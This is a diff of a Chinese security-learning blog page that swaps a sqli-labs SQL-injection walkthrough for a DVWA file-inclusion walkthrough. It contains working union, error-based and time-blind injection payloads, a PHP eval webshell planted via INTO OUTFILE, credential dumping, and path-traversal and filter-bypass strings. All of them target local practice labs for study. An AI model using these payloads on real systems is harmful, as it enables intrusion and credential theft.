@@ -22,7 +22,7 @@
     <meta name="description" content="Saying and doing are two different things.">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>通过sql-labs进行sql注入学习(一) · Lemon&#39;s blog</title>
+    <title>文件包含漏洞——DVWA练习 · Lemon&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">Lemon&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">通过sql-labs进行sql注入学习(一)</a>
+                <a href="#" class="post-name">文件包含漏洞——DVWA练习</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            通过sql-labs进行sql注入学习(一)
+            文件包含漏洞——DVWA练习
             <!-- 404 -->
             
         </h1>
@@ -256,7 +256,7 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                Record my learning process of SQL-labs.
+                Record my learning process of File Include.
             
             <!-- 404 -->
             
@@ -268,18 +268,18 @@ height:50vh;
                 
                     <div class="post-intro-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="SQL注入">SQL注入</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="文件包含">文件包含</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">2.8k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.4k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/06/09</span>
+                    <span class="post-intro-time">2019/08/09</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -403,66 +403,51 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>SQL注入有很多方法，先接触最简单最直观的一种——<strong>联合查询注入</strong></p>
-<p><strong>联合查询注入原理</strong><br>联合查询的前提是需要有<strong>显示位</strong>，而显示位就是通过用户的查询从<strong>数据库中返回到页面的数据</strong>，是可变化的。<br> 例如：sql-labs前四关都是联合查询注入</p>
-<h6 id="sql-labs-一"><a href="#sql-labs-一" class="headerlink" title="sql-labs(一)"></a><strong>sql-labs(一)</strong></h6><p><img src="http://i2.tiimg.com/690112/076773b2218fa22d.png" alt="在这里插入图片描述"><br> 输入id=1或id=2，都会返回数据，而且返回的数据不相同。<br> 接下来就开始实战，通过实战来了解<strong>联合查询注入的步骤和方法</strong>。</p>
-<p> <strong>一、判断注入点</strong><br> 闭合符号一般是<code>&#39;</code>,<code>&quot;</code>,或<code>无闭合符号</code>或<code>&#39;)</code>，<code>&quot;)</code><br> <code>--+</code>为注释符号<br> 在url框中输入<code>?id=2&#39;</code>，发现<br><img src="http://i2.tiimg.com/690112/412afbaf07f69ab2.png" alt="在这里插入图片描述"><br> 用<code>--+</code>将后面的字符注释掉，发现<br><img src="http://i2.tiimg.com/690112/fb3547f78d47c81e.png" alt="在这里插入图片描述"><br> 正常显示，说明注入点是单引号。<br><strong>二、判断列数</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=2' order by 4--+</span></span><br></pre></td></tr></table></figure></p>
-<p>发现<br> <img src="http://i2.tiimg.com/690112/58fb1298ce202c03.png" alt="在这里插入图片描述"><br> 一共三列，接下来就开始联合查询。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,2,3--+</span></span><br></pre></td></tr></table></figure></p>
-<p>这里将<code>id</code>等于一个数据库不存在的数，通过联合查询能看出我们输入的数据在哪里能够显示出来。<br><img src="http://i2.tiimg.com/690112/9898eef63b75020c.png" alt="在这里插入图片描述"><br>在<code>2，3</code>的位置我们便可插入我们想用的语句了。</p>
-<p><strong>三、爆数据库</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,database(),3--+</span></span><br></pre></td></tr></table></figure></p>
-<p>通过一个<code>database()</code>函数便可获知当前数据库。<br><img src="http://i2.tiimg.com/690112/7bc8e18823f438fd.png" alt="在这里插入图片描述"><br><strong>四、爆数据表</strong></p>
-<blockquote>
-<p>在此之前，我们要知道在MySQL中有<code>information_schema</code>这个库，该库存放了所有数据库的信息。<br>information_schema.columns包含所有表的字段<br>    table_schema                数据库名<br>    table_name                  表名<br>    column_name                 列名<br>    information_schema.tables包含所有库的表名<br>    table_schema                数据库名<br>    table_name                  表名<br>    information_schema.schemata包含所有数据库的名<br>    schema_name                 数据库名<br>    group_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
-<p>了解之后，才会更明白一些语句为何这样那样构造，接下来就开始查询数据表。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</span></span><br></pre></td></tr></table></figure></p>
+        <p><strong>前言：在学习文件上传时，制作的图片马需要我们手动去解析，而解析的方法就算用到了文件包含漏洞，所以这次就来学习一下文件包含漏洞。</strong></p>
+<hr>
+<h3 id="文件包含漏洞简介"><a href="#文件包含漏洞简介" class="headerlink" title="文件包含漏洞简介"></a><strong>文件包含漏洞简介</strong></h3><blockquote>
+<p>（一）文件包含可以分为<strong>本地文件包含</strong>和<strong>远程文件包含</strong>两种。文件包含和文件上传一样本身并不是漏洞，而是攻击者利用了包含的特性加上了应用本身对文件控制不严格，对include进来的文件不可控，才导致了一系列危害。<br>（二）本地文件包含就是通过URL将服务器本地的其他文件include进来。远程文件包含就是将远程服务器的文件include进来。<br>（三）最主要的是，包含进来的文件都以当前脚本文件解析，例如，当前测试系统是Apache加php环境，那么被include进来的文件，不管是什么类型，例如图片，文本文档等，这些文件被包含以后，都会被当做<strong>php脚本</strong>来解析。</p>
 </blockquote>
-<p><img src="http://i2.tiimg.com/690112/2f12a326de24eed7.png" alt="在这里插入图片描述"><br><strong>五、爆字段</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+</span></span><br></pre></td></tr></table></figure></p>
-<p> 也可以<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://img-blog.csdnimg.cn/20190602205152176.png" alt="在这里插入图片描述"><br> <strong>六、爆值</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+</span></span><br></pre></td></tr></table></figure></p>
-<p><code>0x3a</code>是<code>:</code>用来区分用户名和密码，不至于混淆。<br><img src="http://i2.tiimg.com/690112/895fc0a333cfa07d.png" alt="在这里插入图片描述"><br>这样，用户名和密码就爆出来了。</p>
-<h6 id="sql-labs-二"><a href="#sql-labs-二" class="headerlink" title="sql-labs(二)"></a><strong>sql-labs(二)</strong></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-2/?id=1 order by 4--+</span></span><br></pre></td></tr></table></figure>
-<p>无闭合符号</p>
-<h6 id="sql-labs-三"><a href="#sql-labs-三" class="headerlink" title="sql-labs(三)"></a><strong>sql-labs(三)</strong></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 4--+</span></span><br></pre></td></tr></table></figure>
-<p>闭合符号为<code>&#39;)</code></p>
-<h6 id="sql-labs-四"><a href="#sql-labs-四" class="headerlink" title="sql-labs(四)"></a><strong>sql-labs(四)</strong></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-4/?id=1") order by 4--+</span></span><br></pre></td></tr></table></figure>
-<p>闭合符号为<code>&quot;)</code><br><img src="http://i2.tiimg.com/690112/1e696d4ab106e2bd.png" alt="在这里插入图片描述"><br>其他步骤与第一关相同，这里就不阐述了。</p>
-<p>接下来介绍第二种注入方式——<strong>报错注入</strong><br><strong>报错注入原理</strong><br>报错注入是基于没有回显数据，只有报错语句的基础上才使用，例如sql-labs的第五关。<br><img src="http://i2.tiimg.com/690112/a7df2e3b8fa5e23d.png" alt="在这里插入图片描述"><br>这里即使id输入正确，也只会显示一个YOU are in……，但如果输入错误的语句时，会出现报错语句。<br><img src="http://i2.tiimg.com/690112/fe7ac54965906da2.png" alt="在这里插入图片描述"><br><strong>那思路来了，我们可以故意构造报错语句，其中插入我们想要的语句，这样即使报错了，在语句中也含有我们想要的数据。</strong><br>网上有很多常见的报错注入语句，但是要理解原理，才能更好的使用这些语句。<br><strong>一、Duplicate entry报错</strong><br>报错注入的经典语句：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> select <span class="number">1</span>,count(*),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.columns group by x;–+</span><br><span class="line">version()可以替换为需要查询的信息。</span><br></pre></td></tr></table></figure></p>
-<p>简化语句：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,count(*)  from information_schema.<span class="function">columns group by <span class="title">concat</span><span class="params">(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)*<span class="number">2</span>))</span></span>;–+</span><br></pre></td></tr></table></figure></p>
-<p>在使用之前，我们要知道一些函数的作用</p>
-<blockquote>
-<p>Count()计算总数<br>Concat()连接字符串<br>Floor()向下取整数<br>Rand()产生0～1的随机数<br>rand(0)序列是011011<br>group by a  会根据a的规则对数据进行分组,而分组的时候,mysql会建立一个临时空表进行分组</p>
+<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a><strong>本地文件包含</strong></h3><blockquote>
+<p>通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格 的过滤允许遍历目录的字符注入浏览器并执行。<br>总的来说就是被包含的文件在服务器本地</p>
 </blockquote>
-<p>这里看了很多大佬的博客，搞清楚了Duplicate entry报错的原理。<br><code>union select 1,count(*),concat(version(),floor(rand(0)*2))x from information_schema.columns group by x;–+</code><br>网上最常见的语句就是这个，但为何报错？？ 因为count(<em>)和floor(rand(0)</em>2)的位置问题吗？？，其实不是的，这里也就不饶弯子了。其实<strong>报错的原因在与<code>rand()</code>函数在查询的时候会执行了一次，而插入的时候又会执行一次，group by 创建的临时表，第一次查询是0，,因为是空表所以插入这条,而插入的时候rand()又执行了一次，再执行一次因为表中已经有数据1，那么新添加的数据相加变成2，这里相当已经执行了三次（但其实是二次），所以011011就又排到0了，到了第三次执行rand()是值为0,因为表中不存在所以要插入新的数据,这次插入rand()再次执行,所以插入的又是1.而表中已经存在1了此时插入因为重复出现同一个key,就会出现报错 重复出现key</strong>。<br><img src="http://i2.tiimg.com/690112/2a92c961ed9c9c66.png" alt="在这里插入图片描述"><img src="http://i2.tiimg.com/690112/9b33ca9c03f501ef.png" alt="在这里插入图片描述"><br>所以这也是为何floor(rand(0)*2)报错是有条件的，记录必须3条以上的原因<br><img src="http://i2.tiimg.com/690112/81d71440c654940e.png" alt="在这里插入图片描述"><br>这里我们觉得可以多去看看大佬的博客，他们写的真的非常详细，例如：<br><a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">MYSQL报错注入原理</a><br><a href="https://www.freebuf.com/column/158705.html" target="_blank" rel="noopener">sql注入之报错注入</a><br><a href="https://www.cnblogs.com/Triomphe/p/9489639.html" target="_blank" rel="noopener">MYSQL常见注入原理</a><br>懂其原理，便可做题。</p>
-<h6 id="sql-labs-五"><a href="#sql-labs-五" class="headerlink" title="sql-labs(五)"></a><strong>sql-labs(五)</strong></h6><p> 首先判断出单引号闭合<br> 利用经典语句<br> <strong>一、爆出数据库</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-5/?id=2' union select 1,2,count(*)  from information_schema.columns group by concat(database(),0x3a,floor(rand(0)*2));--+</span></span><br></pre></td></tr></table></figure>
-<p>这里要注意的是报错语句会出现一个1，有时可能弄混淆，所以我们加上<code>0x3a</code>即<code>:</code>来隔开这个1。<br><img src="http://i2.tiimg.com/690112/0319160a138faac0.png" alt="在这里插入图片描述"><br>报错语句中又我们想要的信息，数据库名，接下来就爆表名。<br><strong>二、爆表名</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x;--+</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="http://i2.tiimg.com/690112/39ff19c600e475a1.png" alt="在这里插入图片描述"><br>爆出我们想要的表名<br><strong>三、爆字段值</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="http://i2.tiimg.com/690112/5c5d00ce79906e11.png" alt="在这里插入图片描述"><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 2,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="http://i2.tiimg.com/690112/8bf1006ffa24ef71.png" alt="在这里插入图片描述"><br>爆出了字段</p>
-<p><strong>四、爆值</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-5/?id=1' Union select 1,count(*),concat((select username from users limit 0,1),0x3a,floor(rand(0)*2))x from information_schema.columns group by x;--+</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="http://i2.tiimg.com/690112/aef93ea0902a4ff8.png" alt="在这里插入图片描述"><br> 这样就爆出用户名和密码了。</p>
-<h6 id="sql-labs-六"><a href="#sql-labs-六" class="headerlink" title="sql-labs(六)"></a><strong>sql-labs(六)</strong></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-6/?id=2" union select 1,2,count(*)  from information_schema.columns group by concat(database(),0x3a,floor(rand(0)*2));--+</span></span><br></pre></td></tr></table></figure>
-<p>闭合符号为<code>&quot;</code><img src="http://i2.tiimg.com/690112/bfd9a488e0abe83f.png" alt="在这里插入图片描述"><br>其它的步骤与sql-labs(五)相同，一步一步就可以爆出你想要的信息。</p>
-<p>通过第七关学到了很多东西，<strong>菜刀</strong>的使用，而且学到一种注入方法。<br><img src="http://i2.tiimg.com/690112/ec22259268f79af3.png" alt="在这里插入图片描述"><br>首先就先首先菜刀的方法，这个贼过瘾。。。<br>之前总看大佬的博客中有<strong>一句话</strong>，我都不知道是什么意思今天终于搞清楚了一些，就先用第七关来练习一下。<br><strong>第一种方法-使用菜刀</strong><br><strong>一、判断注入点</strong><br><img src="http://i2.tiimg.com/690112/05ee7d15799660bc.png" alt="在这里插入图片描述"><br>但这时的报错语句已经统一规范成这样了，所以只有挨个试。<br>试出来注入点为<code>1&#39;))</code><br><strong>二、查列数</strong><br>一共三列<br><strong>三、构造一句话</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,'&lt;?php @eval($_POST["mi"])?&gt;',user() into outfile "D://6.php"--+</span></span><br></pre></td></tr></table></figure></p>
-<p>注意这里将上传文件路径改为phpstudy的根目录，其他目录菜刀连接时会没有权限。<br><img src="http://i2.tiimg.com/690112/a7f023ebbe24acf0.png" alt="在这里插入图片描述"><br>将一句话文件上传到根目录后，开始动用菜刀，右键点击添加。<br><img src="http://i2.tiimg.com/690112/635bb566f353db1e.png" alt="在这里插入图片描述"><br><strong>地址</strong>填入你上传文件的地址<br><img src="http://i2.tiimg.com/690112/dee35b79aaac453d.png" alt="在这里插入图片描述"><br>后面的小框中填入一句话中构造的<strong>密码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&lt;?php @eval($_POST[&quot;mi&quot;])?&gt;&apos;</span><br></pre></td></tr></table></figure></p>
-<p>如：我构造的密码为mi<br>点击连接<br><img src="http://i2.tiimg.com/690112/fb9c395aec807907.png" alt="在这里插入图片描述"><br>这多过瘾，比慢慢爆出数据库过瘾多了，这直接进入服务器了。</p>
-<p><strong>第二种方法-手工注入</strong><br>只要判断出了闭合符号，其他按照那些固定的语句来吧。<br><strong>一、爆列</strong><br>这个就不演示了，一共就三列。<br><strong>二、爆表</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,table_name,3 from information_schema.tables where table_schema='security'  into outfile "D://SQL//7.php"--+</span></span><br></pre></td></tr></table></figure></p>
-<p>去D盘的SQL目录中查看文件<br><img src="http://i2.tiimg.com/690112/911824e75e8ca90a.png" alt="在这里插入图片描述"><br>果然显示出来了<br><strong>三、爆字段</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 into outfile "D://SQL//8.php"--+</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="http://i2.tiimg.com/690112/0ae0de3e7a3bb0c3.png" alt="在这里插入图片描述"><br><strong>四、爆值</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-7/?id=1')) union select 1,group_concat(username,0x3a,password),3 from users into outfile "D://SQL//9.php"--+</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="http://i2.tiimg.com/690112/9f1f1ce31debfb99.png" alt="在这里插入图片描述"><br>会发现这些语句都是固定不变的，变的只是一些注入方式而已，所以懂得原理很重要。</p>
-<h6 id="sql-labs-八"><a href="#sql-labs-八" class="headerlink" title="sql-labs(八)"></a><strong>sql-labs(八)</strong></h6><p>与第七关不同的就是没有了报错提醒<br><img src="http://i2.tiimg.com/690112/a93ed78e13180254.png" alt="在这里插入图片描述"><br>闭合符号为：<code>&#39;</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-8/?id=1' union select 1,'&lt;?php @eval($_POST["mi"])?&gt;',user() into outfile "D://8.php"--+</span></span><br></pre></td></tr></table></figure>
-<p>利用<strong>一句话</strong>和第七关相同。<br>手工注入的话和第七关的方法相同，这里就不演示了<br><img src="http://i2.tiimg.com/690112/445e88bc8993208b.png" alt="在这里插入图片描述"></p>
-<p>接下来就要学习一种新的注入方式，<strong>时间延时盲注</strong>，具体通过第九关来看。</p>
-<h6 id="sql-labs-九"><a href="#sql-labs-九" class="headerlink" title="sql-labs(九)"></a><strong>sql-labs(九)</strong></h6><p>在第九关中，无论我们怎么判断闭合符号，其显示的只是<br><img src="http://i2.tiimg.com/690112/29d6f77ac8fdcba6.png" alt="在这里插入图片描述"><br>因此我们需要换一种方式来查看到底那个是闭合符号</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-9/?id=1' and sleep(10)--+</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://i2.tiimg.com/690112/c337f5a66c2a8602.png" alt="在这里插入图片描述"><br>发现确实延迟了10秒，所以判断<code>&#39;</code>为闭合符号。<br>再使用延时注入前，需要知道几个时间注入的函数</p>
-<blockquote>
-<p>sleep()                             //延迟函数<br>if(condition,true,false)               //条件语句<br>ascii()                              //转换成ascii码<br>substr(“string”,strart,length)      //取出字符串里的第几位开始，长度多少的字符</p>
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a><strong>远程文件包含</strong></h3><blockquote>
+<p>在远程服务器上预先设置好的脚本，然后攻击者利用该漏洞包含一个远程的文件，这种漏洞的出现是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码<br>简单的说就是被包含的文件在第三方服务器</p>
 </blockquote>
-<p><strong>判断数据库名长度</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1'</span> <span class="keyword">and</span> <span class="keyword">if</span>(length(database())&gt;<span class="number">1</span>,sleep(<span class="number">4</span>),<span class="number">0</span>) --+</span><br></pre></td></tr></table></figure></p>
-<p><strong>爆出数据库名</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1'</span><span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;M,sleep(<span class="number">5</span>),<span class="number">0</span>) --+</span><br></pre></td></tr></table></figure></p>
-<p>原理很明显，提取数据库中的第一个字符，转化为ascll码，然后和<code>M</code>相比较，如果大于则睡5秒，否则不睡，这样就可以判断出第一个字符。通过改变<code>substr函数</code>后面的<code>两个变量和M</code>，我们就可以对数据库名进行猜解。</p>
-<p>不建议手工注入，效率会很低，写一个python脚本跑一下就可以爆出来，目前自己还在学习python，等学完之后再写一个盲注的脚本，直接用别人的总感觉不太好。<strong>sql-labs(十)</strong>大致也是基于时间盲注的原理，只不过闭合符号不同罢了，就先学习到这里。</p>
+<h3 id="文件包含常用函数"><a href="#文件包含常用函数" class="headerlink" title="文件包含常用函数"></a><strong>文件包含常用函数</strong></h3><p>以<strong>php</strong>为例，常用的文件包含函数有：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Include</span>()</span><br><span class="line"><span class="comment">#当包含并运行指定文件时，包含的外部文件发生错误，系统会给出警告，但整个php文件还会继续执行。</span></span><br><span class="line"><span class="keyword">Require</span>()</span><br><span class="line"><span class="comment">/*require()与 include()的区别在于 require()执行如果发生错误，函数会输出</span></span><br><span class="line"><span class="comment">错误信息，并终止脚本的运行。*/</span></span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="comment">/*和include没有什么区别，只是在导入函数之前先检测下该文件是否被include过，如果已经执行了一遍，那么就不在进行第二次的include操作。*/</span></span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="comment">#功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<h1 id="DVWA练习"><a href="#DVWA练习" class="headerlink" title="DVWA练习"></a><strong>DVWA练习</strong></h1><p>了解了一些文件包含漏洞的简介和常用函数，下面就通过<strong>万能的DVWA</strong>来进行文件包含漏洞的练习</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注意:</span><br><span class="line">使用远程包含需要开启allow_url_include</span><br></pre></td></tr></table></figure>
+<p>在此之前，先来了解一下<code>./和../以及/</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ 		根目录</span><br><span class="line">./		是当前目录</span><br><span class="line">../  返回到上一级目录</span><br><span class="line">../../ 返回了两级目录</span><br><span class="line">.\ 、..\和./、../意义相同</span><br></pre></td></tr></table></figure>
+<h3 id="low"><a href="#low" class="headerlink" title="low"></a><strong>low</strong></h3><p><img src="http://img-blog.csdnimg.cn/20190811105255502.png" alt="在这里插入图片描述"><br>观察源码发现直接是get方法进去，没有任何过滤，那么就来执行文件包含漏洞<br>输入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../../phpinfo.php</span><br></pre></td></tr></table></figure>
+<p>发现<img src="http://img-blog.csdnimg.cn/20190811105727326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>本地文件包含成功</p>
+<p><strong>远程文件包含</strong><br>这里就先在自己的服务器根目录（WWW目录下）下创建一个文件<img src="http://img-blog.csdnimg.cn/20190811110842388.png" alt="在这里插入图片描述"><br>然后通过远程文件包含来执行<br>输入<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=http:<span class="comment">//127.0.0.1/file.txt</span></span><br></pre></td></tr></table></figure></p>
+<p>发现远程包含成功<br><img src="http://img-blog.csdnimg.cn/2019081111124094.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里也可以用虚拟机和主机来进行远程文件包含漏洞的测试，不过这里就以本地的服务器来进行测试。</p>
+<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a><strong>medium</strong></h3><p><img src="http://img-blog.csdnimg.cn/20190811111512587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）</span><br></pre></td></tr></table></figure>
+<p>发现medium已经过滤了<code>http://</code>、<code>../</code>等，那么就来构造这样的方法来进行绕过<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=..././..././phpinfo.php</span><br></pre></td></tr></table></figure></p>
+<p>源码中过滤了<code>../</code>，所以我们输入的经过过滤后变成</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../../phpinfo.php</span><br></pre></td></tr></table></figure>
+<p>这样依旧是没有过滤掉<code>../</code>，通过错位进行拼接成<code>../</code></p>
+<p>其实感觉绕过方法大多都是互通的，这种绕过在SQL注入、XSS攻击等都是出现过的<br><img src="http://img-blog.csdnimg.cn/20190811112632598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>本地文件包含成功，接下来来尝试远程文件包含</p>
+<p>源码中是过滤了<code>http://</code>、<code>https://</code>,可以尝试大小写进行绕过，也可以通过双写进行绕过例如：<code>httphttp://://</code></p>
